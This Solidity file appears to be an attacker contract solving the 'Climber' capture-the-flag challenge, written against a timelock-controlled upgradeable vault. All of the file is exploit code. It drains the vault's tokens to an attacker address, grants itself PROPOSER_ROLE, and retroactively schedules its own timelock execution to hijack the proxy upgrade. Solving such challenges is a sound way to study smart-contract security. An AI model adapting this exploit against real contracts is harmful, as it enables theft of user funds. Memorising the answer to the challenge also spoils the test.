// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "../climber/ClimberTimelock.sol";

contract ClimberAttacker is OwnableUpgradeable, UUPSUpgradeable {
    constructor() {
    }

    function getProxiedAddress() public view returns (address a) {
        assembly {
            // a := sload( bytes32(uint256(keccak256('eip1967.proxy.implementation')) - 1) )
            // cf EIP-1967
            a := sload (0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc)
        }
    }

    function sweep(IERC20 token, address sweeper) external {
        // We drain the vault account
        token.transfer(sweeper, token.balanceOf(address(this)));

        // Get address of our owner
        ClimberTimelock timelock = ClimberTimelock(payable(owner()));

        // Now we will call timelock.schedule() to authorize the timelock.execute() transaction attacker made
        // Don't be confused: address(this) is the proxy address and we are currently running code located at the address getProxiedAddress()
        address[] memory targets = new address[](2);
        uint256[] memory values = new uint256[](2);
        bytes[] memory dataElements = new bytes[](2);

        // First call is adding the PROPOSER_ROLE to this contract
        targets[0] = owner();
        values[0] = 0;
        dataElements[0] = abi.encodeWithSelector(timelock.grantRole.selector,
            keccak256("PROPOSER_ROLE"),
            address(this)
        );

        // Second call is upgrading the old vault to this one
        targets[1] = address(this);
        values[1] = 0;
        dataElements[1] = abi.encodeWithSelector(this.upgradeToAndCall.selector,
            getProxiedAddress(),
            abi.encodeWithSelector(this.sweep.selector,
                address(token),
                sweeper
            )
        );

        timelock.schedule(
            targets,
            values,
            dataElements,
            bytes32("")
        );
    }

    function _authorizeUpgrade(address newImplementation) internal onlyOwner override {}
}
